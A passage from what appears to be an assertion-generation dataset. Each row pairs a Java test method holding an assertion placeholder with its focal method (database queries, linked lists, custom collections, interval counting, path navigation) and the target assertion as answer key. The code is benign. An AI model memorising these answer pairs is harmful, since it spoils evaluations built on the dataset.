queryMethodsWithAnnotation(boolean queryFullMethod, String annotationClassName) { List<WriteDbData4MethodAnnotation> list = queryMethodsAndHashWithAnnotation(annotationClassName); if (list == null) { return null; }  List<String> stringList = new ArrayList<>(list.size()); for (WriteDbData4MethodAnnotation methodAnnotation : list) { stringList.add(queryFullMethod ? methodAnnotation.getFullMethod() : methodAnnotation.getMethodHash()); } return stringList; }"	assertFalse(JavaCGUtil.isCollectionEmpty(methodHashList))
"test2() { try (FieldInfoHandler fieldInfoHandler = new FieldInfoHandler(configureWrapper)) { List<WriteDbData4FieldInfo> fieldInfoList = fieldInfoHandler.queryClassCustomTypeFields(TestOutClass.class.getName()); Assert.""<AssertPlaceHolder>""; printListContent(fieldInfoList, ""custom_type""); } }
queryClassCustomTypeFields(String className) { SqlKeyEnum sqlKeyEnum = SqlKeyEnum.FI_QUERY_BY_CLASS_CUSTOM_TYPE; String sql = dbOperWrapper.getCachedSql(sqlKeyEnum); if (sql == null) { sql = ""select "" + JACGSqlUtil.getTableAllColumns(DbTableInfoEnum.DTIE_FIELD_INFO) + "" from "" + DbTableInfoEnum.DTIE_FIELD_INFO.getTableName() + "" where "" + DC.FI_SIMPLE_CLASS_NAME + "" = ?"" + "" and "" + DC.FI_FIELD_TYPE + "" not like concat(?, '%')"" + "" and "" + DC.FI_PRIMITIVE_TYPE + "" = ?""; sql = dbOperWrapper.cacheSql(sqlKeyEnum, sql); } return dbOperator.queryList(sql, WriteDbData4FieldInfo.class, dbOperWrapper.getSimpleClassName(className), JavaCGCommonNameConstants.PACKAGE_JAVA, JavaCGYesNoEnum.NO.getIntValue()); }"	assertFalse(JavaCGUtil.isCollectionEmpty(fieldInfoList))
"test2() { try (FieldRelationshipHandler fieldRelationshipHandler = new FieldRelationshipHandler(configureWrapper)) { List<WriteDbData4FieldRelationship> list = fieldRelationshipHandler.queryCallerMethodByRelationship(FRADtoB.class.getName(), ""setStrField1"", FRADtoA.class.getName(), ""getStr1""); Assert.""<AssertPlaceHolder>""; printListContent(list); } }
queryCallerMethodByRelationship(String getClassName, String getMethodName, String setClassName, String setMethodName) { SqlKeyEnum sqlKeyEnum = SqlKeyEnum.FR_QUERY_CALLER_METHOD; String sql = dbOperWrapper.getCachedSql(sqlKeyEnum); if (sql == null) { sql = ""select distinct "" + JACGSqlUtil.joinColumns(DC.FR_CALLER_FULL_METHOD, DC.FR_CALLER_LINE_NUMBER) + "" from "" + DbTableInfoEnum.DTIE_FIELD_RELATIONSHIP.getTableName() + "" where "" + DC.FR_GET_SIMPLE_CLASS_NAME + "" = ?"" + "" and "" + DC.FR_GET_METHOD_NAME + "" = ?"" + "" and "" + DC.FR_SET_SIMPLE_CLASS_NAME + "" = ?"" + "" and "" + DC.FR_SET_METHOD_NAME + "" = ?"" + "" and "" + DC.FR_VALID + "" = ?""; sql = dbOperWrapper.cacheSql(sqlKeyEnum, sql); } String simpleGetClassName = dbOperWrapper.getSimpleClassName(getClassName); String simpleSetClassName = dbOperWrapper.getSimpleClassName(setClassName); return dbOperator.queryList(sql, WriteDbData4FieldRelationship.class, simpleGetClassName, getMethodName, simpleSetClassName, setMethodName, JavaCGYesNoEnum.YES.getIntValue()); }"	assertTrue(JavaCGUtil.isCollectionEmpty(list))
"test2() { try (GetSetMethodHandler getSetMethodHandler = new GetSetMethodHandler(configureWrapper)) { List<BaseWriteDbData4GetSetMethod> list = getSetMethodHandler.queryGetSetMethodByClassName(true, FRADtoA.class.getName()); Assert.""<AssertPlaceHolder>""; printListContent(list, ""queryGetSetMethodByClassName-get""); } }
queryGetSetMethodByClassName(boolean queryGetMethod, String className) { String simpleClassName = dbOperWrapper.getSimpleClassName(className); SqlKeyEnum sqlKeyEnum = queryGetMethod ? SqlKeyEnum.GM_QUERY_BY_CLASS_NAME : SqlKeyEnum.SM_QUERY_BY_CLASS_NAME; String sql = dbOperWrapper.getCachedSql(sqlKeyEnum); if (sql == null) { sql = ""select "" + JACGSqlUtil.joinColumns(DC.GET_SET_METHOD_COLUMNS) + "" from "" + getGetSetMethodTableName(queryGetMethod) + "" where "" + DC.GSM_SIMPLE_CLASS_NAME + "" = ?""; sql = dbOperWrapper.cacheSql(sqlKeyEnum, sql); } List<BaseWriteDbData4GetSetMethod> list = dbOperator.queryList(sql, BaseWriteDbData4GetSetMethod.class, simpleClassName); if (list != null) { list.sort(Comparator4GetSetMethod.getInstance()); for (BaseWriteDbData4GetSetMethod getSetMethod : list) { getSetMethod.setGetOrSet(queryGetMethod); } } return list; }"	assertFalse(JavaCGUtil.isCollectionEmpty(list))
"test3() { try (GetSetMethodHandler getSetMethodHandler = new GetSetMethodHandler(configureWrapper)) { List<BaseWriteDbData4GetSetMethod> list = getSetMethodHandler.queryGetSetMethodByClassName(false, FRADtoA.class.getName()); Assert.""<AssertPlaceHolder>""; printListContent(list, ""queryGetSetMethodByClassName-set""); } }
queryGetSetMethodByClassName(boolean queryGetMethod, String className) { String simpleClassName = dbOperWrapper.getSimpleClassName(className); SqlKeyEnum sqlKeyEnum = queryGetMethod ? SqlKeyEnum.GM_QUERY_BY_CLASS_NAME : SqlKeyEnum.SM_QUERY_BY_CLASS_NAME; String sql = dbOperWrapper.getCachedSql(sqlKeyEnum); if (sql == null) { sql = ""select "" + JACGSqlUtil.joinColumns(DC.GET_SET_METHOD_COLUMNS) + "" from "" + getGetSetMethodTableName(queryGetMethod) + "" where "" + DC.GSM_SIMPLE_CLASS_NAME + "" = ?""; sql = dbOperWrapper.cacheSql(sqlKeyEnum, sql); } List<BaseWriteDbData4GetSetMethod> list = dbOperator.queryList(sql, BaseWriteDbData4GetSetMethod.class, simpleClassName); if (list != null) { list.sort(Comparator4GetSetMethod.getInstance()); for (BaseWriteDbData4GetSetMethod getSetMethod : list) { getSetMethod.setGetOrSet(queryGetMethod); } } return list; }"	assertFalse(JavaCGUtil.isCollectionEmpty(list))
"test1() { try (JarInfoHandler jarInfoHandler = new JarInfoHandler(configureWrapper)) { List<WriteDbData4JarInfo> jarInfoList = jarInfoHandler.queryAllJarInfo(); Assert.""<AssertPlaceHolder>""; printListContent(jarInfoList); } }
queryAllJarInfo() { SqlKeyEnum sqlKeyEnum = SqlKeyEnum.JI_QUERY_JAR_INFO; String sql = dbOperWrapper.getCachedSql(sqlKeyEnum); if (sql == null) { sql = ""select "" + JACGSqlUtil.getTableAllColumns(DbTableInfoEnum.DTIE_JAR_INFO) + "" from "" + DbTableInfoEnum.DTIE_JAR_INFO.getTableName(); sql = dbOperWrapper.cacheSql(sqlKeyEnum, sql); } return dbOperator.queryList(sql, WriteDbData4JarInfo.class); }"	assertFalse(JavaCGUtil.isCollectionEmpty(jarInfoList))
"testQueryMethodCatchByType() { try (MethodExceptionHandler methodExceptionBaseHandler = new MethodExceptionHandler(configureWrapper)) { List<WriteDbData4MethodCatch> methodTryCatchFinallyList = methodExceptionBaseHandler.queryMethodCatchBySimpleCatchExceptionType(Exception.class.getName()); Assert.""<AssertPlaceHolder>""; printListContent(methodTryCatchFinallyList); } }
queryMethodCatchBySimpleCatchExceptionType(String simpleCatchExceptionType) { SqlKeyEnum sqlKeyEnum = SqlKeyEnum.MCTH_QUERY_BY_TYPE; String sql = dbOperWrapper.getCachedSql(sqlKeyEnum); if (sql == null) { sql = "" select "" + JACGSqlUtil.getTableAllColumns(DbTableInfoEnum.DTIE_METHOD_CATCH) + "" from "" + DbTableInfoEnum.DTIE_METHOD_CATCH.getTableName() + "" where "" + DC.MCTH_SIMPLE_CATCH_EXCEPTION_TYPE + "" = ?""; sql = dbOperWrapper.cacheSql(sqlKeyEnum, sql); } return dbOperator.queryList(sql, WriteDbData4MethodCatch.class, dbOperWrapper.getSimpleClassName(simpleCatchExceptionType)); }"	assertFalse(JavaCGUtil.isCollectionEmpty(methodTryCatchFinallyList))
"testGetAllControllerMethod() { try (SpringHandler springHandler = new SpringHandler(configureWrapper)) { List<SpringControllerInfo> springControllerInfoList = springHandler.getAllControllerMethod(); Assert.""<AssertPlaceHolder>""; printListContent(springControllerInfoList); } }
getAllControllerMethod() { SqlKeyEnum sqlKeyEnum = SqlKeyEnum.SPC_QUERY; String sql = dbOperWrapper.getCachedSql(sqlKeyEnum); if (sql == null) { sql = ""select "" + JACGSqlUtil.joinColumns(DC.SPC_SHOW_URI, DC.SPC_FULL_METHOD) + "" from "" + DbTableInfoEnum.DTIE_SPRING_CONTROLLER.getTableName(); sql = dbOperWrapper.cacheSql(sqlKeyEnum, sql); }  List<WriteDbData4SpringController> list = dbOperator.queryList(sql, WriteDbData4SpringController.class); if (JavaCGUtil.isCollectionEmpty(list)) { return Collections.emptyList(); } List<SpringControllerInfo> springControllerInfoList = new ArrayList<>(list.size()); for (WriteDbData4SpringController springController : list) { SpringControllerInfo springControllerInfo = new SpringControllerInfo(springController.getShowUri(), springController.getFullMethod()); springControllerInfoList.add(springControllerInfo); } springControllerInfoList.sort(Comparator4SpringControllerInfo.getInstance()); return springControllerInfoList; }"	assertFalse(JavaCGUtil.isCollectionEmpty(springControllerInfoList))
"testGetAllTaskMethod() { try (SpringHandler springHandler = new SpringHandler(configureWrapper)) { List<String> springTaskMethodList = springHandler.getAllTaskMethod(); Assert.""<AssertPlaceHolder>""; printListContent(springTaskMethodList); } }
getAllTaskMethod() { SqlKeyEnum sqlKeyEnum = SqlKeyEnum.SPT_QUERY; String sql = dbOperWrapper.getCachedSql(sqlKeyEnum); if (sql == null) { sql = ""select "" + JACGSqlUtil.joinColumns(DC.SPT_CLASS_NAME, DC.SPT_METHOD_NAME) + "" from "" + DbTableInfoEnum.DTIE_SPRING_TASK.getTableName(); sql = dbOperWrapper.cacheSql(sqlKeyEnum, sql); }  List<WriteDbData4SpringTask> list = dbOperator.queryList(sql, WriteDbData4SpringTask.class); if (JavaCGUtil.isCollectionEmpty(list)) { return Collections.emptyList(); } List<String> springTaskMethodList = new ArrayList<>(list.size()); for (WriteDbData4SpringTask springTask : list) { String fullMethod = JavaCGClassMethodUtil.formatFullMethodStr(springTask.getClassName(), springTask.getMethodName()); springTaskMethodList.add(fullMethod); } Collections.sort(springTaskMethodList); return springTaskMethodList; }"	assertFalse(JavaCGUtil.isCollectionEmpty(springTaskMethodList))
"test1() { MethodCatchExceptionUsageReporter methodCatchExceptionUsageReporter = new MethodCatchExceptionUsageReporter(configureWrapper, ""build/catch_exception_report"", false, false); Assert.""<AssertPlaceHolder>""; }
genMethodCatchExceptionUsageReporter(String... expectedMethods) { if (ArrayUtils.isEmpty(expectedMethods)) { logger.error(""预期会使用catch的异常对象的方法未在参数中指定""); return false; }  // 设置所有的类都需要处理（否则 throw new Exception() 不会被处理） configureWrapper.setAllowAllClasses();  // 公共预处理，包含写数据库步骤 if (!commonPreHandle()) { return false; }  if (catchSeq == null) { catchSeq = new JavaCGCounter(0); }  // 将字符串形式的类名与方法名数组转换为对象列表形式 List<ClassAndMethodName> expectedClassAndMethodNameList = JACGClassMethodUtil.genClassAndMethodNameListFromString(expectedMethods); String reportFilePathAll = genReportFilePath(METHOD_CATCH_EXCEPTION_USAGE_REPORT_ALL); String reportFilePathCheck = genReportFilePath(METHOD_CATCH_EXCEPTION_USAGE_REPORT_CHECK); try (MethodExceptionHandler methodExceptionHandler = new MethodExceptionHandler(configureWrapper); WriterSupportHeader writer4All = new WriterSupportHeader(reportFilePathAll, chooseFileHeader4All(), appendReportFile); WriterSupportHeader writer4Check = new WriterSupportHeader(reportFilePathCheck, chooseFileHeader4Check(), appendReportFile)) { // 查询方法catch信息表中所有的简单类名 List<String> methodCatchSimpleClassNameList = methodExceptionHandler.queryMethodCatchSimpleClassNameList(); if (JavaCGUtil.isCollectionEmpty(methodCatchSimpleClassNameList)) { logger.warn(""未查询到方法catch信息""); return true; }  for (String methodCatchSimpleClassName : methodCatchSimpleClassNameList) { /* 记录已处理过的catch代码块开始指令偏移量，避免重复处理 key:    方法HASH+长度 value:  方法对应的已处理过的catch代码块开始指令偏移量集合 */ Map<String, Set<Integer>> methodCatchStartOffsetMap = new HashMap<>(); // 查询指定简单类名的方法catch信息 List<WriteDbData4MethodCatch> methodCatchList = methodExceptionHandler.queryMethodCatchListBySimpleClassNameExcludeFlag(methodCatchSimpleClassName); for (WriteDbData4MethodCatch methodCatch : methodCatchList) { // 处理一个方法catch handleOneMethodCatch(methodCatch, methodCatchStartOffsetMap, methodExceptionHandler, writer4All, writer4Check, expectedClassAndMethodNameList); } } return true; } catch (Exception e) { logger.error(""error "", e); return false; } }"	assertTrue(methodCatchExceptionUsageReporter.genMethodCatchExceptionUsageReporter(LOGGER_METHOD_ARRAY))
"testSkipWriteDb() { JavaCGCounter catchSeq = new JavaCGCounter(10000); MethodCatchExceptionUsageReporter methodCatchExceptionUsageReporter = new MethodCatchExceptionUsageReporter(configureWrapper, ""build/catch_exception_report"", false, true); methodCatchExceptionUsageReporter.setCatchSeq(catchSeq); Assert.""<AssertPlaceHolder>""; }
genMethodCatchExceptionUsageReporter(String... expectedMethods) { if (ArrayUtils.isEmpty(expectedMethods)) { logger.error(""预期会使用catch的异常对象的方法未在参数中指定""); return false; }  // 设置所有的类都需要处理（否则 throw new Exception() 不会被处理） configureWrapper.setAllowAllClasses();  // 公共预处理，包含写数据库步骤 if (!commonPreHandle()) { return false; }  if (catchSeq == null) { catchSeq = new JavaCGCounter(0); }  // 将字符串形式的类名与方法名数组转换为对象列表形式 List<ClassAndMethodName> expectedClassAndMethodNameList = JACGClassMethodUtil.genClassAndMethodNameListFromString(expectedMethods); String reportFilePathAll = genReportFilePath(METHOD_CATCH_EXCEPTION_USAGE_REPORT_ALL); String reportFilePathCheck = genReportFilePath(METHOD_CATCH_EXCEPTION_USAGE_REPORT_CHECK); try (MethodExceptionHandler methodExceptionHandler = new MethodExceptionHandler(configureWrapper); WriterSupportHeader writer4All = new WriterSupportHeader(reportFilePathAll, chooseFileHeader4All(), appendReportFile); WriterSupportHeader writer4Check = new WriterSupportHeader(reportFilePathCheck, chooseFileHeader4Check(), appendReportFile)) { // 查询方法catch信息表中所有的简单类名 List<String> methodCatchSimpleClassNameList = methodExceptionHandler.queryMethodCatchSimpleClassNameList(); if (JavaCGUtil.isCollectionEmpty(methodCatchSimpleClassNameList)) { logger.warn(""未查询到方法catch信息""); return true; }  for (String methodCatchSimpleClassName : methodCatchSimpleClassNameList) { /* 记录已处理过的catch代码块开始指令偏移量，避免重复处理 key:    方法HASH+长度 value:  方法对应的已处理过的catch代码块开始指令偏移量集合 */ Map<String, Set<Integer>> methodCatchStartOffsetMap = new HashMap<>(); // 查询指定简单类名的方法catch信息 List<WriteDbData4MethodCatch> methodCatchList = methodExceptionHandler.queryMethodCatchListBySimpleClassNameExcludeFlag(methodCatchSimpleClassName); for (WriteDbData4MethodCatch methodCatch : methodCatchList) { // 处理一个方法catch handleOneMethodCatch(methodCatch, methodCatchStartOffsetMap, methodExceptionHandler, writer4All, writer4Check, expectedClassAndMethodNameList); } } return true; } catch (Exception e) { logger.error(""error "", e); return false; } }"	assertTrue(methodCatchExceptionUsageReporter.genMethodCatchExceptionUsageReporter(LOGGER_METHOD_ARRAY))
"testWay1() { ""<AssertPlaceHolder>""; }
way1(List<Person> persons) { return persons.stream() .map(Person::getNames) .flatMap(Collection::stream) .distinct().toList(); }"	"assertThat(way1(persons)) .containsExactlyInAnyOrder(""A"", ""B"", ""D"", ""C"", ""X"")"
"testWay2() { ""<AssertPlaceHolder>""; }
way2(List<Person> persons) { return persons.stream() .map(Person::getNames) .flatMap(Collection::stream) .collect(Collectors.toSet()) .stream().toList(); }"	"assertThat(way2(persons)) .containsExactlyInAnyOrder(""A"", ""B"", ""D"", ""C"", ""X"")"
"findForSingleNode() { Node head = new Node(10);  ""<AssertPlaceHolder>""; }
isPresent(Node head) { var slow = head; var fast = head;  while (true) { fast = fast.next; if (fast == slow) { return true; } if (fast == null) { return false; }  slow = slow.next; fast = fast.next; if (fast == slow) { return true; } if (fast == null) { return false; } } }"	assertFalse(LoopInLinkedList.isPresent(head))
"find() { Node head = new Node(10, new Node(12, new Node(13)));  ""<AssertPlaceHolder>""; }
isPresent(Node head) { var slow = head; var fast = head;  while (true) { fast = fast.next; if (fast == slow) { return true; } if (fast == null) { return false; }  slow = slow.next; fast = fast.next; if (fast == slow) { return true; } if (fast == null) { return false; } } }"	assertFalse(LoopInLinkedList.isPresent(head))
"findForSingleNodeWithLoop() { Node head = new Node(10); head.setNext(head);  ""<AssertPlaceHolder>""; }
isPresent(Node head) { var slow = head; var fast = head;  while (true) { fast = fast.next; if (fast == slow) { return true; } if (fast == null) { return false; }  slow = slow.next; fast = fast.next; if (fast == slow) { return true; } if (fast == null) { return false; } } }"	assertTrue(LoopInLinkedList.isPresent(head))
"testRemoveForNull() { ""<AssertPlaceHolder>""; }
remove(Node head) { if (head == null) { return null; }  var last = head; var curr = head.next;  while (curr != null) { if (last.value == curr.value) { last.next = curr.next; } else { last = curr; }  curr = curr.next; } return head; }"	assertThat(remove(null)).isNull()
"testRemoveForNull() { ""<AssertPlaceHolder>""; }
remove(Node head) { if (head == null) { return null; }  Deque<Node> stack = new ArrayDeque<>(); var curr = head;  while (curr != null && curr.next != null) { stack.push(curr); curr = curr.next;  if (curr.value == stack.peek().value) { while (curr != null && curr.value == stack.peek().value) { curr = curr.next; } stack.pop();  if (stack.isEmpty()) { head = curr; continue; }  var prev = stack.peek(); prev.next = curr; } }  return head; }"	assertThat(remove(null)).isNull()
"testRemoveWhenDuplicatesOnly() { var head = buildLinkedList(new int[]{10, 10, 10, 10, 10});  var result = remove(head);  ""<AssertPlaceHolder>""; }
remove(Node head) { if (head == null) { return null; }  Deque<Node> stack = new ArrayDeque<>(); var curr = head;  while (curr != null && curr.next != null) { stack.push(curr); curr = curr.next;  if (curr.value == stack.peek().value) { while (curr != null && curr.value == stack.peek().value) { curr = curr.next; } stack.pop();  if (stack.isEmpty()) { head = curr; continue; }  var prev = stack.peek(); prev.next = curr; } }  return head; }"	assertThat(result).isNull()
"reverseUsingStack() { List<Integer> list = asList(1, 4, 8, 9, 2, 7);  List<Integer> result = ReverseAnySequence.reverseUsingStack(list);  Collections.reverse(list); ""<AssertPlaceHolder>""; }
reverseUsingStack(List<T> list) { var stack = new ArrayDeque<T>(); list.forEach(stack::push); return stack.stream().toList(); }"	assertThat(result).isEqualTo(list)
"reverseUsingRecursion() { List<Integer> list = asList(1, 4, 8, 9, 2, 7);  List<Integer> result = ReverseAnySequence.reverseUsingRecursion(list);  Collections.reverse(list); ""<AssertPlaceHolder>""; }
reverseUsingRecursion(List<T> list) { if (list.size() == 1) { return list; }  var firstItem = list.get(0); List<T> subList = list.subList(1, list.size()); return compose(reverseUsingRecursion(subList), firstItem); }"	assertThat(result).isEqualTo(list)
"reverseUsingLoop() { List<Integer> list = asList(1, 4, 8, 9, 2, 7);  List<Integer> result = ReverseAnySequence.reverseUsingLoop(list);  Collections.reverse(list); ""<AssertPlaceHolder>""; }
reverseUsingLoop(List<T> list) { for (int i = 0; i < list.size() / 2; i++) { swap(list, i, list.size() - 1 - i); } return list; }"	assertThat(result).isEqualTo(list)
"testReverseUsingLoopForNull() { ""<AssertPlaceHolder>""; }
reverseUsingLoop(Node head) { Node prev = null; Node curr = head;  while (curr != null) { Node tmp = curr.next; curr.next = prev; prev = curr; curr = tmp; } return prev; }"	assertNull(reverseUsingLoop(null))
"testReverseUsingStackForNull() { ""<AssertPlaceHolder>""; }
reverseUsingStack(Node head) { Deque<Node> stack = new ArrayDeque<>(); Node curr = head; while (curr != null) { stack.push(curr); curr = curr.next; }  Node result = stack.peek();  curr = result; while (!stack.isEmpty()) { curr.next = stack.pop(); curr = curr.next; curr.next = null; }  return result; }"	assertNull(reverseUsingStack(null))
"testReverseUsingRecursionForNull() { ""<AssertPlaceHolder>""; }
reverseUsingRecursion(Node head) { return recursion(null, head); }"	assertNull(reverseUsingRecursion(null))
"testForEach() { CustomArrayList<Integer> list = new CustomArrayList<>(); list.add(3); list.add(7); list.add(12);  var result = new ArrayList<>(); for (var item : list) { result.add(item); } ""<AssertPlaceHolder>""; }
add(T value) { add(size, value); }"	assertThat(result, is(List.of(3, 7, 12)))
"testForEachForEmptyList() { CustomArrayList<Integer> list = new CustomArrayList<>();  var result = new ArrayList<>(); for (var item : list) { result.add(item); } ""<AssertPlaceHolder>""; }
add(T value) { add(size, value); }"	assertThat(result, is(List.of()))
"testToString() { CustomArrayList<String> list = new CustomArrayList<>(); list.add(""Andrei""); list.add(""Tikhon""); list.add(""Ilya"");  ""<AssertPlaceHolder>""; }
toString() { return Arrays.toString(Arrays.copyOf(array, size)); }"	"assertThat(list.toString(), is(""[Andrei, Tikhon, Ilya]""))"
"testToString() { var map = new CustomHashMap(); map.put(2, 5); map.put(7, 45);  ""<AssertPlaceHolder>""; }
toString() { StringBuilder sb = new StringBuilder(); for (var bucket : buckets) { for (var item : bucket) { sb.append(""%s->%s, "".formatted(item.getKey(), item.getValue())); } } return ""{"" + sb.substring(0, sb.length() - 2) + ""}""; }"	"assertThat(map.toString(), is(""{2->5, 7->45}""))"
"testToString() { CustomHashSet<String> set = new CustomHashSet<>(); set.add(""Andrei""); set.add(""Tikhon""); set.add(""Yulia""); set.add(""Elena"");  ""<AssertPlaceHolder>""; }
toString() { StringBuilder sb = new StringBuilder(); var it = iterator(); while (it.hasNext()) { final T item = it.next(); sb.append(item + "", ""); } return ""["" + sb.substring(0, sb.length() - 2) + ""]""; }"	"assertThat(set.toString(), is(""[Elena, Yulia, Andrei, Tikhon]""))"
"testToString() { CustomLinkedHashSet<String> set = new CustomLinkedHashSet<>(); set.add(""Andrei""); set.add(""Tikhon""); set.add(""Yulia""); set.add(""Elena"");  ""<AssertPlaceHolder>""; }
add(T item) { final boolean result = super.add(item); if (result) { linkedList.add(item); } return result; }"	"assertThat(set.toString(), is(""[Andrei, Tikhon, Yulia, Elena]""))"
"testForEach() { CustomLinkedList<Integer> linkedList = new CustomLinkedList<>(); linkedList.add(3); linkedList.add(7); linkedList.add(12);  var result = new ArrayList<>(); for (var item : linkedList) { result.add(item); } ""<AssertPlaceHolder>""; }
add(T value) { add(size, value); }"	assertThat(result, is(List.of(3, 7, 12)))
"testForEachForEmptyList() { CustomLinkedList<Integer> linkedList = new CustomLinkedList<>();  var result = new ArrayList<>(); for (var item : linkedList) { result.add(item); } ""<AssertPlaceHolder>""; }
add(T value) { add(size, value); }"	assertThat(result, is(List.of()))
"compactWhenOneNumber() { ""<AssertPlaceHolder>""; }
compact(int[] values) { if (values.length == 0) { return """"; }  Arrays.sort(values);  List<Range> ranges = new ArrayList<>(); Range draftRange = new Range(values[0], values[0]); ranges.add(draftRange);  for (var value : values) { if ((value - draftRange.right) <= 1) { draftRange.right = value; continue; }  draftRange = new Range(value, value); ranges.add(draftRange); }  return ranges.stream() .map(range -> { if (range.left == range.right) { return String.valueOf(range.left); } return range.left + ""-"" + range.right; }) .collect(Collectors.joining("","")); }"	"assertThat(ranges.compact(new int[]{1}), is(""1""))"
"withdraw() { var result = atm.withdraw(450);  ""<AssertPlaceHolder>""; }
withdraw(int amount) { var result = new HashMap<Integer, Integer>();  for (var nominal : nominals) { if (nominal > amount || state.get(nominal) == 0) { continue; }  int count = amount / nominal; count = Math.min(count, state.get(nominal)); result.put(nominal, count);  amount -= nominal * count;  if (amount == 0) { break; } }  if (amount > 0) { throw new IllegalStateException(""Could not perform withdraw!""); }  for (var nominal : result.keySet()) { state.put(nominal, state.get(nominal) - result.get(nominal)); }  return result; }"	assertThat(result).isEqualTo(Map.of( 100, 2, 50, 5 ))
"countWithoutOverlapping() { int[][] times = { {10, 30}, {40, 50} };  ""<AssertPlaceHolder>""; }
count(int[][] times) { var events = new ArrayList<EventItem>(); for (var time : times) { events.add(new EventItem(time[0], START)); events.add(new EventItem(time[1], STOP)); }  Collections.sort(events, Comparator.comparingInt(EventItem::getTime));  var current = 0; var max = 0; for (var event : events) { current += (event.eventType == EventType.START) ? +1 : -1; if (current > max) { max = current; } } return max; }"	assertThat(count(times), is(1))
"countWithOverlapping() { int[][] times = { {10, 30}, {20, 50} };  ""<AssertPlaceHolder>""; }
count(int[][] times) { var events = new ArrayList<EventItem>(); for (var time : times) { events.add(new EventItem(time[0], START)); events.add(new EventItem(time[1], STOP)); }  Collections.sort(events, Comparator.comparingInt(EventItem::getTime));  var current = 0; var max = 0; for (var event : events) { current += (event.eventType == EventType.START) ? +1 : -1; if (current > max) { max = current; } } return max; }"	assertThat(count(times), is(2))
"countComplexCase() { int[][] times = { {10, 30}, {20, 40}, {39, 50}, {60, 110}, {80, 90}, {30, 70}, {10, 120} };  ""<AssertPlaceHolder>""; }
count(int[][] times) { var events = new ArrayList<EventItem>(); for (var time : times) { events.add(new EventItem(time[0], START)); events.add(new EventItem(time[1], STOP)); }  Collections.sort(events, Comparator.comparingInt(EventItem::getTime));  var current = 0; var max = 0; for (var event : events) { current += (event.eventType == EventType.START) ? +1 : -1; if (current > max) { max = current; } } return max; }"	assertThat(count(times), is(4))
"executeExercise() { var exercise = new CustomExercise();  DrivingExam.executeExercise(exercise);  ""<AssertPlaceHolder>""; }
executeExercise(IExercise exercise) { try { exercise.start(); exercise.execute(); } catch (Exception e) { markNegativePoints(exercise); } finally { exercise.end(); } }"	assertThat(exercise.actionLog).isEqualTo(List.of(START, EXECUTE, END))
"executeExerciseWhenStartFailed() { var exercise = new CustomExercise() { @Override public void start() { super.start(); throw new RuntimeException(); } };  DrivingExam.executeExercise(exercise);  ""<AssertPlaceHolder>""; }
executeExercise(IExercise exercise) { try { exercise.start(); exercise.execute(); } catch (Exception e) { markNegativePoints(exercise); } finally { exercise.end(); } }"	assertThat(exercise.actionLog).isEqualTo(List.of(START, MARK_NEGATIVE, END))
"executeExerciseWhenExecuteFailed() { var exercise = new CustomExercise() { @Override public void execute() { super.execute(); throw new RuntimeException(); } };  DrivingExam.executeExercise(exercise);  ""<AssertPlaceHolder>""; }
executeExercise(IExercise exercise) { try { exercise.start(); exercise.execute(); } catch (Exception e) { markNegativePoints(exercise); } finally { exercise.end(); } }"	assertThat(exercise.actionLog).isEqualTo(List.of(START, EXECUTE, MARK_NEGATIVE, END))
"executeExerciseWhenStartAndMarkNegativeFailed() { var exercise = new CustomExercise() { @Override public void start() { super.start(); throw new RuntimeException(); }  @Override public void markNegativePoints() { super.markNegativePoints(); throw new RuntimeException(); } };  DrivingExam.executeExercise(exercise);  ""<AssertPlaceHolder>""; }
executeExercise(IExercise exercise) { try { exercise.start(); exercise.execute(); } catch (Exception e) { markNegativePoints(exercise); } finally { exercise.end(); } }"	assertThat(exercise.actionLog).isEqualTo(List.of(START, MARK_NEGATIVE, END))
"executeExerciseWhenExecuteAndMarkNegativeFailed() { var exercise = new CustomExercise() { @Override public void execute() { super.execute(); throw new RuntimeException(); }  @Override public void markNegativePoints() { super.markNegativePoints(); throw new RuntimeException(); } };  DrivingExam.executeExercise(exercise);  ""<AssertPlaceHolder>""; }
executeExercise(IExercise exercise) { try { exercise.start(); exercise.execute(); } catch (Exception e) { markNegativePoints(exercise); } finally { exercise.end(); } }"	assertThat(exercise.actionLog).isEqualTo(List.of(START, EXECUTE, MARK_NEGATIVE, END))
"moveToParentDir() { FileSystemPath path = new FileSystemPath(""/a/b/c/d""); path.cd(""../x""); ""<AssertPlaceHolder>""; }
cd(String newPath) { path = process(newPath); }"	"assertThat(path.getPath(), is(""/a/b/c/x""))"
"moveToParentDir2() { FileSystemPath path = new FileSystemPath(""/a/b/c/d""); path.cd(""../../x/d""); ""<AssertPlaceHolder>""; }
cd(String newPath) { path = process(newPath); }"	"assertThat(path.getPath(), is(""/a/b/x/d""))"
"moveToPathFromRoot() { FileSystemPath path = new FileSystemPath(""/a/b/c/d""); path.cd(""/f/g/h""); ""<AssertPlaceHolder>""; }
cd(String newPath) { path = process(newPath); }"	"assertThat(path.getPath(), is(""/f/g/h""))"
"moveToRootDirectly() { FileSystemPath path = new FileSystemPath(""/a/b/c/d""); path.cd(""/""); ""<AssertPlaceHolder>""; }
cd(String newPath) { path = process(newPath); }"	"assertThat(path.getPath(), is(""/""))"
"moveFromCurrentDir() { FileSystemPath path = new FileSystemPath(""/a/b/c/d""); path.cd(""./f/g""); ""<AssertPlaceHolder>""; }
cd(String newPath) { path = process(newPath); }"	"assertThat(path.getPath(), is(""/a/b/c/d/f/g""))"
"moveFromCurrentDir2() { FileSystemPath path = new FileSystemPath(""/a/b/c/d""); path.cd(""f/g""); ""<AssertPlaceHolder>""; }
cd(String newPath) { path = process(newPath); }"	"assertThat(path.getPath(), is(""/a/b/c/d/f/g""))"
"longerSideWhenOneLink() { LinkOfChain chainLink = new LinkOfChain(); ""<AssertPlaceHolder>""; }
longerSide() { LinkOfChain left = this.left; LinkOfChain right = this.right;  while (true) { if (left == right) { return Side.NONE; } if (left == null) { return Side.RIGHT; } if (right == null) { return Side.LEFT; }  left = left.left; right = right.right; } }"	assertThat(chainLink.longerSide(), is(Side.NONE))
"rotate() { var matrix = buildMatrix();  MatrixRotation.rotate(matrix, 2);  ""<AssertPlaceHolder>""; }
